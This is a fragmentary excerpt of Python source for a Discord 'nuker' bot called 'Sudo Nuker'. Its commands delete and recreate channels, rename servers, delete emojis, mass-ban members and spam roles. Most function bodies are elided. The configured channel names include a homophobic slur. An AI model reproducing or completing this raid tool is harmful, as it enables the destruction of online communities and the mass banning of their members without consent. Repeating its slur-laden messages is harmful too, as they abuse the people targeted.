...
if os.path.exists("config.json"):
    ...
    "channel_names": ["Sudo Nuked You","HOLD THIS L","Get Fucked Faggots" ],
...
@bot.event
async def on_ready():
    System.Title("Sudo Nuker - Made By Bantorban")
    System.Size(101, 15)
    Cursor.HideCursor()
    os.system('cls')
    print("\n\n\n")
 ...
 | (___  | |  | || |  | || |  | |  |  \| | _   _ | | __ ___  _ __ 
  \___ \ | |  | || |  | || |  | |  | . ` || | | || |/ // _ \| '__|
  ____) || |__| || |__| || |__| |  | |\  || |_| ||   <|  __/| |   
 |_____/  \____/ |_____/  \____/   |_| \_| \__,_||_|\_\\___||_|   
...
async def nuke(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    System.Title(f'Sudo Nuker - Nuking . . .')
    ...
    await guild.create_text_channel("Sudo Nuked You")
...
async def rename(ctx):
    System.Title(f'Sudo Nuker - Renaming . . .')
    await ctx.message.delete()
    try:
...
async def emoji(ctx):
    System.Title(f'Sudo Nuker - Deleting Emojis . . .')
    await ctx.message.delete()
    try:
...
async def massban(ctx):
    System.Title(f'Sudo Nuker - Massbaning . . .')
    await ctx.message.delete()
    try:
...
async def spamrole(ctx, name="EzNuke"):
    System.Title(f'Sudo Nuker - Spamming Roles . . .')
    guild = ctx.guild
    await ctx.message.delete()
    amount = 50
